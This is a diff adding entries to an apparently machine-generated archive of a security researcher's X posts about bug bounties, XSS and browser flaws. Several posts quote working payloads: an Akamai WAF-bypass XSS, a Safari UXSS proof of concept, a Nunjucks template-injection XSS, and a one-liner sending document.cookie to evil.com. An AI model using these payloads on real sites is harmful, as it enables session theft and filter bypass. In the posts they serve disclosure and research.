@@ -2,9 +2,9 @@
 
 _Generated 2026-11-11 from the X API (full-archive search + timeline). Every post below is copied word-for-word; t.co links are expanded; quoted posts are inlined in full; media are listed with alt text when the author provided it. Posts are grouped by conversation (a thread = the author's root post followed by their own replies, oldest first). Groups are newest first. An agent without X access can rely on this file._
 
-- Posts in this file: 57
-- Conversations/threads: 48
-- Oldest post captured: 2023-08-09
+- Posts in this file: 98
+- Conversations/threads: 89
+- Oldest post captured: 2016-08-02
 - Newest post captured: 2026-10-24
 
 
@@ -96,6 +96,22 @@ Tags (automatic): AI-assisted hunting, Platform: Bugcrowd
 
 
 Tags (automatic): XSS
+
+
+**Context — post being replied to:**
+
+#### Parent post — @garethheyes — 2025-04-26 13:00 UTC (2025-04-26 14:00 WAT)
+
+- URL: https://x.com/garethheyes/status/1916115054421831981
+- Metrics (at fetch): bookmark 76, impression 7914, like 120, quote 0, reply 1, retweet 24
+
+> Firefox treats multipart/x-mixed-replace like HTML. Chrome doesn’t.
+> That tiny difference? It can turn a "non-exploitable" XSS into a real one.
+> Abuse boundary handling, bypass filters, and make your payload land.
+>
+> https://thespanner.co.uk/making-the-unexploitable-exploitable-with-x-mixed-replace-on-firefox
+
+**Links in post:** https://thespanner.co.uk/making-the-unexploitable-exploitable-with-x-mixed-replace-on-firefox
 
 
 ### Post — @fransrosen — 2025-04-26 13:12 UTC (2025-04-26 14:12 WAT)
@@ -858,7 +874,19 @@ Tags (automatic): XSS
 
 > Congrats @infosec_au! Well deserved! 👌💪♥️ https://t.co/13ZvrjJPUI
 
-**Quoted post** 1702720468162392278: not readable via the API (deleted, private, or withheld).
+**Quoted post (full text):**
+
+    #### Quoted post — @infosec_au — 2023-09-15 16:26 UTC (2023-09-15 17:26 WAT)
+    
+    - URL: https://x.com/infosec_au/status/1702720468162392278
+    - Metrics (at fetch): bookmark 8, impression 53284, like 438, quote 2, reply 63, retweet 14
+    
+    > Won MVH at H1-813! Thanks so much to my collaborators @JonathanBouman and @zseano, and especially the PayPal and HackerOne team for this event. So many great hackers and submissions. Stoked to be a part of this. https://t.co/gF8pmiwOAZ
+    
+    **Media:**
+    - photo: https://pbs.twimg.com/media/F6FHPaqaIAASf_l.jpg — no alt text provided by author
+    - photo: https://pbs.twimg.com/media/F6FHPalboAEeT5W.jpg — no alt text provided by author
+    
 
 
 ---
@@ -874,3 +902,782 @@ Tags (automatic): XSS
 > Three time MVH. Feels good, not gonna lie. https://t.co/9c41bZUJ1W
 
 **Quoted post** 1689135689579843584: not readable via the API (deleted, private, or withheld).
+
+
+---
+
+## 2021-09-17 · Post · There's something beautiful and nostalgic about old XSS-alerts from reports sent almost 10 years ago
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2021-09-17 17:38 UTC (2021-09-17 18:38 WAT)
+
+- URL: https://x.com/fransrosen/status/1438920317980876802
+- Metrics (at fetch): not returned
+
+> There's something beautiful and nostalgic about old XSS-alerts from reports sent almost 10 years ago. [pic.x.com/JE3vDoACNz]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/E_gSZs4WUAEkFNw.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/E_gSZswWYAIdCdD.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/E_gSZs2WQAE1F8M.jpg — no alt text provided by author
+
+
+---
+
+## 2021-03-03 · Post · I wrote a simple reflection script which helps a lot to find script gadgets (@kkotowicz @slekies @si
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2021-03-03 18:03 UTC (2021-03-03 19:03 WAT)
+
+- URL: https://x.com/fransrosen/status/1367173805140037632
+- Metrics (at fetch): not returned
+
+> I wrote a simple reflection script which helps a lot to find script gadgets (@kkotowicz @slekies @sirdarckcat) for XSS. There are probably more advanced solutions but it makes it a lot easier to go through large amounts of js-files to find candidates. https://gist.github.com/fransr/2b294feff892660ee87b1e4dfae5127d [pic.x.com/I3fxLiByRJ]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/EvktJITWYAYBfSX.jpg — no alt text provided by author
+
+**Links in post:** https://gist.github.com/fransr/2b294feff892660ee87b1e4dfae5127d
+
+
+---
+
+## 2021-02-18 · Post · We did some fun tricks with nginx on bug bounties a while back, and made a post about out the config
+
+
+### Post — @fransrosen — 2021-02-18 16:24 UTC (2021-02-18 17:24 WAT)
+
+- URL: https://x.com/fransrosen/status/1362437752504147969
+- Metrics (at fetch): not returned
+
+> We did some fun tricks with nginx on bug bounties a while back, and made a post about out the configurations being vulnerable
+> https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/
+
+**Links in post:** https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/
+
+
+---
+
+## 2019-10-02 · Post · If you have an AppleTV named as an XSS-payload it will trigger when AirPlay is used in Safari on iOS
+
+
+Tags (automatic): XSS, Mobile / Android / iOS
+
+
+### Post — @fransrosen — 2019-10-02 18:11 UTC (2019-10-02 19:11 WAT)
+
+- URL: https://x.com/fransrosen/status/1179458907900698626
+- Metrics (at fetch): not returned
+
+> If you have an AppleTV named as an XSS-payload it will trigger when AirPlay is used in Safari on iOS. A pretty far-fetched UXSS I would say. [pic.x.com/SGMiIHHDrX]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/EF5Hn8KWkAENRmb.jpg — no alt text provided by author
+
+
+---
+
+## 2019-09-12 · Post · Great post with the company's perspective on their own bug bounty program by @SpotifyEng! Also a nic
+
+
+### Post — @fransrosen — 2019-09-12 22:06 UTC (2019-09-12 23:06 WAT)
+
+- URL: https://x.com/fransrosen/status/1172270388073717760
+- Metrics (at fetch): not returned
+
+> Great post with the company's perspective on their own bug bounty program by @SpotifyEng! Also a nice little shoutout to @_zulln :) https://twitter.com/SpotifyEng/status/1172184719108313093
+
+**Links in post:** https://twitter.com/SpotifyEng/status/1172184719108313093
+
+**Quoted post (full text):**
+
+    #### Quoted post — @2850397899 — 2019-09-12 16:26 UTC (2019-09-12 17:26 WAT)
+    
+    - URL: https://x.com/2850397899/status/1172184719108313093
+    - Metrics (at fetch): not returned
+    
+    > We just celebrated the 2nd year anniversary of our bug bounty program with @Hacker0x01. Read about what we've learned, best practices, and how we work with independent hackers to keep Spotify secure  https://bit.ly/2kevlmR
+    
+    **Links in post:** https://bit.ly/2kevlmR
+    
+
+
+---
+
+## 2019-05-10 · Post · Akamai WAF bypass XSS in HTML-context when no character-filtering exists to trick it: 
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2019-05-10 21:33 UTC (2019-05-10 22:33 WAT)
+
+- URL: https://x.com/fransrosen/status/1126963506723590148
+- Metrics (at fetch): not returned
+
+> Akamai WAF bypass XSS in HTML-context when no character-filtering exists to trick it: 
+>
+> &lt;style&gt;@keyframes a{}b{animation:a;}&lt;/style&gt;&lt;b/onanimationstart=prompt`${document.domain}&amp;#x60;&gt;
+
+
+---
+
+## 2019-04-11 · Post · This is neat! Chrome fetches CSS @imports before the full document is received and by abusing output
+
+
+### Post — @fransrosen — 2019-04-11 05:44 UTC (2019-04-11 06:44 WAT)
+
+- URL: https://x.com/fransrosen/status/1116215298535907328
+- Metrics (at fetch): not returned
+
+> This is neat! Chrome fetches CSS @imports before the full document is received and by abusing output buffers you can import multiple CSS in the same response based on the previous import and do sequential extracting for HTML-attributes. Great writeup! https://twitter.com/d0nutptr/status/1116159879322816513
+
+**Links in post:** https://twitter.com/d0nutptr/status/1116159879322816513
+
+**Quoted post (full text):**
+
+    #### Quoted post — @2215109990 — 2019-04-11 02:03 UTC (2019-04-11 03:03 WAT)
+    
+    - URL: https://x.com/2215109990/status/1116159879322816513
+    - Metrics (at fetch): not returned
+    
+    > Here it is! My blog post on Sequential Import Chaining
+    > https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b
+    > (and tool: https://github.com/d0nutptr/sic)
+    >
+    > #bugbountytip #security
+    
+    **Links in post:** https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b, https://github.com/d0nutptr/sic
+    
+
+
+---
+
+## 2018-09-19 · Post · "There is no reason to do bug bounties. All bugs are already found and the competition is too hard" 
+
+
+### Post — @fransrosen — 2018-09-19 07:43 UTC (2018-09-19 08:43 WAT)
+
+- URL: https://x.com/fransrosen/status/1042318311093096448
+- Metrics (at fetch): not returned
+
+> "There is no reason to do bug bounties. All bugs are already found and the competition is too hard" 
+> – said someone that should watch me and @avlidienbrunn speak at OWASP Stockholm the 2nd of October – "Eliminating False Assumptions in Bug Bounties" https://www.eventbrite.com/e/owasp-stockholm-bug-bounty-theme-tickets-50414001636
+
+**Links in post:** https://www.eventbrite.com/e/owasp-stockholm-bug-bounty-theme-tickets-50414001636
+
+
+---
+
+## 2018-08-08 · Post · I reported a Web Cache Deception bug in Discourse last year, it's public now: https://hackerone.com/
+
+
+Tags (automatic): Platform: HackerOne
+
+
+### Post — @fransrosen — 2018-08-08 18:11 UTC (2018-08-08 19:11 WAT)
+
+- URL: https://x.com/fransrosen/status/1027255899382013952
+- Metrics (at fetch): not returned
+
+> I reported a Web Cache Deception bug in Discourse last year, it's public now: https://hackerone.com/reports/260697 Such a great bug, @omer_gil!
+
+**Links in post:** https://hackerone.com/reports/260697
+
+
+---
+
+## 2018-06-21 · Post · Safari 10 UXSS (CVE-2017-7089) found by me and @i_bo0om last year:
+
+
+### Post — @fransrosen — 2018-06-21 09:19 UTC (2018-06-21 10:19 WAT)
+
+- URL: https://x.com/fransrosen/status/1009727379659468801
+- Metrics (at fetch): not returned
+
+> Safari 10 UXSS (CVE-2017-7089) found by me and @i_bo0om last year:
+>
+> data:text/html,&lt;script&gt;function y(){x=open('parent-tab://google.com','_top'),x.document.body.innerHTML='&lt;img/src=""onerror="alert(document.domain)"&gt;'};setTimeout(y,100)&lt;/script&gt; [pic.x.com/sc1uMIoPF2]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/DgNFRvoWAAAKRvB.png — no alt text provided by author
+
+
+---
+
+## 2018-05-31 · Post · The karaoke place for speaker's dinner for @securityfest holds up! My DOM XSS did not pop....yet. [p
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2018-05-31 21:19 UTC (2018-05-31 22:19 WAT)
+
+- URL: https://x.com/fransrosen/status/1002298499709448193
+- Metrics (at fetch): not returned
+
+> The karaoke place for speaker's dinner for @securityfest holds up! My DOM XSS did not pop....yet. [pic.x.com/77ltuynoVN]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/DejhKc1X4AEiqFS.jpg — no alt text provided by author
+
+
+---
+
+## 2018-03-25 · Post · Yay, I was awarded a $12,500 bounty on @Hacker0x01! https://hackerone.com/fransrosen TogetherWeHitH
+
+
+Tags (automatic): Platform: HackerOne
+
+
+### Post — @fransrosen — 2018-03-25 22:13 UTC (2018-03-25 23:13 WAT)
+
+- URL: https://x.com/fransrosen/status/978032219313852416
+- Metrics (at fetch): not returned
+
+> Yay, I was awarded a $12,500 bounty on @Hacker0x01! https://hackerone.com/fransrosen #TogetherWeHitHarder
+
+**Links in post:** https://hackerone.com/fransrosen
+
+
+---
+
+## 2018-02-12 · Post · A huge amount of sites are doing this wrong still and this is such a beautiful attack. Often leads t
+
+
+Tags (automatic): Account takeover
+
+
+### Post — @fransrosen — 2018-02-12 02:37 UTC (2018-02-12 03:37 WAT)
+
+- URL: https://x.com/fransrosen/status/962878220386238465
+- Metrics (at fetch): not returned
+
+> A huge amount of sites are doing this wrong still and this is such a beautiful attack. Often leads to account takeover due to CSRF-token leakage. Great job again @omer_gil! https://x.com/omer_gil/status/962750099859431424
+
+**Links in post:** https://x.com/omer_gil/status/962750099859431424
+
+**Quoted post (full text):**
+
+    #### Quoted post — @606268342 — 2018-02-11 18:08 UTC (2018-02-11 19:08 WAT)
+    
+    - URL: https://x.com/606268342/status/962750099859431424
+    - Metrics (at fetch): not returned
+    
+    > My #BHUSA talk about the Web Cache Deception attack is now on YouTube:
+    > https://www.youtube.com/watch?v=mroq9eHFOIU
+    > @BlackHatEvents
+    
+    **Links in post:** https://www.youtube.com/watch?v=mroq9eHFOIU
+    
+
+
+---
+
+## 2018-01-20 · Post · Nunjucks template injection XSS, will escape attribute value:
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2018-01-20 16:25 UTC (2018-01-20 17:25 WAT)
+
+- URL: https://x.com/fransrosen/status/954751690036703232
+- Metrics (at fetch): not returned
+
+> Nunjucks template injection XSS, will escape attribute value:
+>
+> {%25+macro+field()+%25}moc.okok//:ptth//)niamod.tnemucod(trela=daolno+gvshttp://http:""//{%25+endmacro+%25}{{+field(1)%7curlize%7creverse%7curlize%7creverse%7curlize%7creverse+}}
+
+
+---
+
+## 2018-01-17 · Post · Broken record for my time-until-bounty!
+
+
+### Post — @fransrosen — 2018-01-17 00:23 UTC (2018-01-17 01:23 WAT)
+
+- URL: https://x.com/fransrosen/status/953422449273720833
+- Metrics (at fetch): not returned
+
+> Broken record for my time-until-bounty!
+> Then: 22 minutes. (@Dropbox )
+> Now: 10 minutes. (Private still, but wow)
+
+
+---
+
+## 2018-01-07 · Post · Electrum 3.0.4 is still vulnerable to some extent, since it allows blind posting of commands using t
+
+
+### Post — @fransrosen — 2018-01-07 21:59 UTC (2018-01-07 22:59 WAT)
+
+- URL: https://x.com/fransrosen/status/950124848126316544
+- Metrics (at fetch): not returned
+
+> Electrum 3.0.4 is still vulnerable to some extent, since it allows blind posting of commands using text/plain. @taviso mentioned gui-command, I did an ugly PoC of it. Safari allows you to find ports which gives errors but are still open. Wait until proper patch is out. [pic.x.com/K3y40rq4kz]
+
+**Media:**
+- video:  — no alt text provided by author
+
+
+---
+
+## 2017-10-01 · Post · I made another dancing alert XSS back in Feb, an obvious dupe tho. Spent more time trying to sync w/
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2017-10-01 21:23 UTC (2017-10-01 22:23 WAT)
+
+- URL: https://x.com/fransrosen/status/914601699318407168
+- Metrics (at fetch): not returned
+
+> I made another dancing alert XSS back in Feb, an obvious dupe tho. Spent more time trying to sync w/ the music :)
+> https://youtu.be/g_zOppkM8tI
+
+**Links in post:** https://youtu.be/g_zOppkM8tI
+
+
+---
+
+## 2017-09-26 · Post · This might lead to some fun XSS on status-code errors:
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2017-09-26 21:47 UTC (2017-09-26 22:47 WAT)
+
+- URL: https://x.com/fransrosen/status/912795907313356800
+- Metrics (at fetch): not returned
+
+> This might lead to some fun XSS on status-code errors:
+> header("HTTP/1.0 999 &lt;img src=x onerror=alert(1)&gt;");
+
+
+---
+
+## 2017-09-01 · Post · If there would be a self-XSS script you could run on Facebook to fix the non-expiry leaked access-to
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2017-09-01 16:47 UTC (2017-09-01 17:47 WAT)
+
+- URL: https://x.com/fransrosen/status/903660555763888128
+- Metrics (at fetch): not returned
+
+> If there would be a self-XSS script you could run on Facebook to fix the non-expiry leaked access-tokens. Should we tell ppl how to do it?
+
+
+---
+
+## 2017-06-29 · Post · "Hopefully, http://webex.com is well maintained and not full of XSS" :( https://bugs.chromium.org/p/
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2017-06-29 11:49 UTC (2017-06-29 12:49 WAT)
+
+- URL: https://x.com/fransrosen/status/880392710674362368
+- Metrics (at fetch): not returned
+
+> "Hopefully, http://webex.com is well maintained and not full of XSS" :( https://bugs.chromium.org/p/project-zero/issues/detail?id=1096 [pic.x.com/BJXRfXWqG4]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/DDfIeJCWsAMBTKi.jpg — no alt text provided by author
+
+**Links in post:** http://webex.com, https://bugs.chromium.org/p/project-zero/issues/detail?id=1096
+
+
+---
+
+## 2017-06-22 · Post · Beautiful attack. Great job @arneswinnen, words of a true champion :) https://x.com/arneswinnen/stat
+
+
+### Post — @fransrosen — 2017-06-22 23:28 UTC (2017-06-23 00:28 WAT)
+
+- URL: https://x.com/fransrosen/status/878031896952832000
+- Metrics (at fetch): not returned
+
+> Beautiful attack. Great job @arneswinnen, words of a true champion :) https://x.com/arneswinnen/status/878025379276926976
+
+**Links in post:** https://x.com/arneswinnen/status/878025379276926976
+
+**Quoted post (full text):**
+
+    #### Quoted post — @316504327 — 2017-06-22 23:02 UTC (2017-06-23 00:02 WAT)
+    
+    - URL: https://x.com/316504327/status/878025379276926976
+    - Metrics (at fetch): not returned
+    
+    > Authentication bypass on Airbnb via OAuth tokens theft #bugbounty  https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/
+    
+    **Links in post:** https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/
+    
+
+
+---
+
+## 2017-06-15 · Post · I have received at least one bounty every month since 2013-11. Worst month was 2016-04 ($300) bount
+
+
+### Post — @fransrosen — 2017-06-15 22:35 UTC (2017-06-15 23:35 WAT)
+
+- URL: https://x.com/fransrosen/status/875481967843835907
+- Metrics (at fetch): not returned
+
+> I have received at least one bounty every month since 2013-11. Worst month was 2016-04 ($300) #bountydash
+
+
+---
+
+## 2017-06-15 · Post · bountydash is now released! BountyDash - A local bug bounty statistics dashboard https://labs.detec
+
+
+### Post — @fransrosen — 2017-06-15 21:35 UTC (2017-06-15 22:35 WAT)
+
+- URL: https://x.com/fransrosen/status/875466927325544451
+- Metrics (at fetch): not returned
+
+> #bountydash is now released! BountyDash - A local bug bounty statistics dashboard https://labs.detectify.com/2017/06/15/bountydash-a-local-bug-bounty-statistics-dashboard/ [pic.x.com/TfgAj886ze]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/DCZIgYCXkAAdgGp.jpg — no alt text provided by author
+
+**Links in post:** https://labs.detectify.com/2017/06/15/bountydash-a-local-bug-bounty-statistics-dashboard/
+
+
+---
+
+## 2017-06-15 · Post · Me and @avlidienbrunn are releasing Bountydash tonight. "To create a better overview and to give you
+
+
+### Post — @fransrosen — 2017-06-15 17:39 UTC (2017-06-15 18:39 WAT)
+
+- URL: https://x.com/fransrosen/status/875407440417873920
+- Metrics (at fetch): not returned
+
+> Me and @avlidienbrunn are releasing Bountydash tonight. "To create a better overview and to give you stats of your bug bounty rewards." [pic.x.com/QmXZXhy8L5]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/DCYSXxgXcAAnqqD.jpg — no alt text provided by author
+
+
+---
+
+## 2017-05-04 · Post · SOP bypass in Safari 10 reported to Apple today. Stay safe out there. Thanks for the collab @i_bo0om
+
+
+### Post — @fransrosen — 2017-05-04 15:09 UTC (2017-05-04 16:09 WAT)
+
+- URL: https://x.com/fransrosen/status/860149495534899200
+- Metrics (at fetch): not returned
+
+> SOP bypass in Safari 10 reported to Apple today. Stay safe out there. Thanks for the collab @i_bo0om [pic.x.com/dufKeeo8Zt]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/C-_dXGsW0AAbSDc.png — no alt text provided by author
+
+
+---
+
+## 2017-02-03 · Post · Really good read from @claudijd regarding Subdomain takeovers.
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2017-02-03 21:31 UTC (2017-02-03 22:31 WAT)
+
+- URL: https://x.com/fransrosen/status/827630624248852480
+- Metrics (at fetch): not returned
+
+> Really good read from @claudijd regarding Subdomain takeovers.
+> "I even went so far as referring to “subdomain takeover as the new XSS”..." https://x.com/claudijd/status/827598728441769984
+
+**Links in post:** https://x.com/claudijd/status/827598728441769984
+
+**Quoted post (full text):**
+
+    #### Quoted post — @181226314 — 2017-02-03 19:24 UTC (2017-02-03 20:24 WAT)
+    
+    - URL: https://x.com/181226314/status/827598728441769984
+    - Metrics (at fetch): not returned
+    
+    > [blog] "'Deep Thoughts' on Subdomain Takeover Vulnerabilities" =&gt; https://blog.rubidus.com/2017/02/03/deep-thoughts-on-subdomain-takeovers/ Feedback welcome!
+    
+    **Links in post:** https://blog.rubidus.com/2017/02/03/deep-thoughts-on-subdomain-takeovers/
+    
+
+
+---
+
+## 2017-02-01 · Post · Hah, today's achievement: my XSS popup dance video on @TechCrunch: https://techcrunch.com/2017/01/31
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2017-02-01 11:21 UTC (2017-02-01 12:21 WAT)
+
+- URL: https://x.com/fransrosen/status/826752203163582464
+- Metrics (at fetch): not returned
+
+> Hah, today's achievement: my XSS popup dance video on @TechCrunch: https://techcrunch.com/2017/01/31/googles-bug-bounty-2016/
+
+**Links in post:** https://techcrunch.com/2017/01/31/googles-bug-bounty-2016/
+
+
+---
+
+## 2017-01-30 · Post · 2016 – When XSS-popup-dancing became a thing. Thanks for the mention, guys! https://x.com/sirdarckca
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2017-01-30 20:09 UTC (2017-01-30 21:09 WAT)
+
+- URL: https://x.com/fransrosen/status/826160429122584578
+- Metrics (at fetch): not returned
+
+> 2016 – When XSS-popup-dancing became a thing. Thanks for the mention, guys! https://x.com/sirdarckcat/status/826120494097252352
+
+**Links in post:** https://x.com/sirdarckcat/status/826120494097252352
+
+**Quoted post (full text):**
+
+    #### Quoted post — @11855992 — 2017-01-30 17:30 UTC (2017-01-30 18:30 WAT)
+    
+    - URL: https://x.com/11855992/status/826120494097252352
+    - Metrics (at fetch): not returned
+    
+    > #Google Vulnerability Rewards Program #VRP: 2016 Year in Review https://security.googleblog.com/2017/01/vulnerability-rewards-program-2016-year.html
+    
+    **Links in post:** https://security.googleblog.com/2017/01/vulnerability-rewards-program-2016-year.html
+    
+
+
+---
+
+## 2017-01-25 · Post · What's your record on finally finding long lasting security vulns? Mine (that I know of) are two bei
+
+
+### Post — @fransrosen — 2017-01-25 23:36 UTC (2017-01-26 00:36 WAT)
+
+- URL: https://x.com/fransrosen/status/824400516293791745
+- Metrics (at fetch): not returned
+
+> What's your record on finally finding long lasting security vulns? Mine (that I know of) are two being vuln for 9 years and one for 4 years.
+
+
+---
+
+## 2017-01-07 · Post · My old fun bug with TCPDF just got public at last. I've still seen instances of vuln versions in the
+
+
+### Post — @fransrosen — 2017-01-07 15:24 UTC (2017-01-07 16:24 WAT)
+
+- URL: https://x.com/fransrosen/status/817753797112041472
+- Metrics (at fetch): not returned
+
+> My old fun bug with TCPDF just got public at last. I've still seen instances of vuln versions in the wild.
+> https://sourceforge.net/p/tcpdf/bugs/1005/
+
+**Links in post:** https://sourceforge.net/p/tcpdf/bugs/1005/
+
+
+---
+
+## 2017-01-02 · Post · "Please don't XSS our password field" [pic.x.com/lELqfAyOAS]
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2017-01-02 23:47 UTC (2017-01-03 00:47 WAT)
+
+- URL: https://x.com/fransrosen/status/816068417576964098
+- Metrics (at fetch): not returned
+
+> "Please don't XSS our password field" [pic.x.com/lELqfAyOAS]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/C1NB2isXcAQuGlY.jpg — no alt text provided by author
+
+
+---
+
+## 2016-10-23 · Post · Just a FYI: Google Tag Manager is XSS as a service.
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2016-10-23 00:08 UTC (2016-10-23 01:08 WAT)
+
+- URL: https://x.com/fransrosen/status/789981830598553600
+- Metrics (at fetch): not returned
+
+> Just a FYI: Google Tag Manager is XSS as a service.
+
+
+---
+
+## 2016-10-19 · Post · Wtching @webtonull talking about the Anatomy of an Attack at @SikkSymp [pic.x.com/FY2IjTsN3z]
+
+
+### Post — @fransrosen — 2016-10-19 11:21 UTC (2016-10-19 12:21 WAT)
+
+- URL: https://x.com/fransrosen/status/788701627532382209
+- Metrics (at fetch): not returned
+
+> Wtching @webtonull talking about the Anatomy of an Attack at @SikkSymp [pic.x.com/FY2IjTsN3z]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/CvIH7s4WYAARA4N.jpg — no alt text provided by author
+
+
+---
+
+## 2016-10-13 · Post · Short XSS cookie extraction (Chrome/FF):
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2016-10-13 20:50 UTC (2016-10-13 21:50 WAT)
+
+- URL: https://x.com/fransrosen/status/786670410968498176
+- Metrics (at fetch): not returned
+
+> Short XSS cookie extraction (Chrome/FF):
+> javascript:fetch(/\/evil.com/,{headers:{x:document.cookie}})
+> (Need CORS on the receiving end) [pic.x.com/1bdzuqCEN6]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/CurQPFAWcAEzo9r.png — no alt text provided by author
+
+
+---
+
+## 2016-10-05 · Post · And yeah, subdomain takeover + CloudFront is a thing. Look for "Bad Request" + CloudFront on both ht
+
+
+### Post — @fransrosen — 2016-10-05 17:02 UTC (2016-10-05 18:02 WAT)
+
+- URL: https://x.com/fransrosen/status/783713894879621122
+- Metrics (at fetch): not returned
+
+> And yeah, subdomain takeover + CloudFront is a thing. Look for "Bad Request" + CloudFront on both http/https + and do a proper PoC...
+
+
+---
+
+## 2016-09-22 · Post · Set.constructor`alert\x28document.domain\x29```
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2016-09-22 17:24 UTC (2016-09-22 18:24 WAT)
+
+- URL: https://x.com/fransrosen/status/779008367767478272
+- Metrics (at fetch): not returned
+
+> Set.constructor`alert\x28document.domain\x29```
+> #es6 #xss
+
+
+---
+
+## 2016-09-20 · Post · Was the backpack by @Hacker0x01 at 702 a bag bounty?
+
+
+Tags (automatic): Platform: HackerOne
+
+
+### Post — @fransrosen — 2016-09-20 19:01 UTC (2016-09-20 20:01 WAT)
+
+- URL: https://x.com/fransrosen/status/778308021139177472
+- Metrics (at fetch): not returned
+
+> Was the backpack by @Hacker0x01 at 702 a bag bounty?
+
+
+---
+
+## 2016-09-07 · Post · My talk tomorrow: The Smörgåsbord of web app hacking – Doing bug bounties as a developer @nordicjs w
+
+
+### Post — @fransrosen — 2016-09-07 17:33 UTC (2016-09-07 18:33 WAT)
+
+- URL: https://x.com/fransrosen/status/773574841890967552
+- Metrics (at fetch): not returned
+
+> My talk tomorrow: The Smörgåsbord of web app hacking – Doing bug bounties as a developer @nordicjs will be streamed! http://nordicjs.com
+
+**Links in post:** http://nordicjs.com
+
+
+---
+
+## 2016-09-01 · Post · Using Chrome's web-custom-data UTI to inject a stored XSS in Slack https://labs.detectify.com/2016/0
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2016-09-01 02:31 UTC (2016-09-01 03:31 WAT)
+
+- URL: https://x.com/fransrosen/status/771173573998194690
+- Metrics (at fetch): not returned
+
+> Using Chrome's web-custom-data UTI to inject a stored XSS in Slack https://labs.detectify.com/2016/09/01/using-chromes-web-custom-data-uti-to-inject-a-stored-xss-in-slack/
+
+**Links in post:** https://labs.detectify.com/2016/09/01/using-chromes-web-custom-data-uti-to-inject-a-stored-xss-in-slack/
+
+
+---
+
+## 2016-08-17 · Post · Mr @jobertabma does it again. RCE/Auth token leakage in Gitlab, update while it's hot: https://gitla
+
+
+Tags (automatic): RCE
+
+
+### Post — @fransrosen — 2016-08-17 00:40 UTC (2016-08-17 01:40 WAT)
+
+- URL: https://x.com/fransrosen/status/765709786281287682
+- Metrics (at fetch): not returned
+
+> Mr @jobertabma does it again. RCE/Auth token leakage in Gitlab, update while it's hot: https://gitlab.com/gitlab-org/gitlab-ce/issues/20974
+
+**Links in post:** https://gitlab.com/gitlab-org/gitlab-ce/issues/20974
+
+
+---
+
+## 2016-08-02 · Post · "Game time! Exploitable Self XSS through Clickjacking Game" memorablebugreports
+
+
+Tags (automatic): XSS
+
+
+### Post — @fransrosen — 2016-08-02 07:58 UTC (2016-08-02 08:58 WAT)
+
+- URL: https://x.com/fransrosen/status/760384285341868032
+- Metrics (at fetch): not returned
+
+> "Game time! Exploitable Self XSS through Clickjacking Game" #memorablebugreports
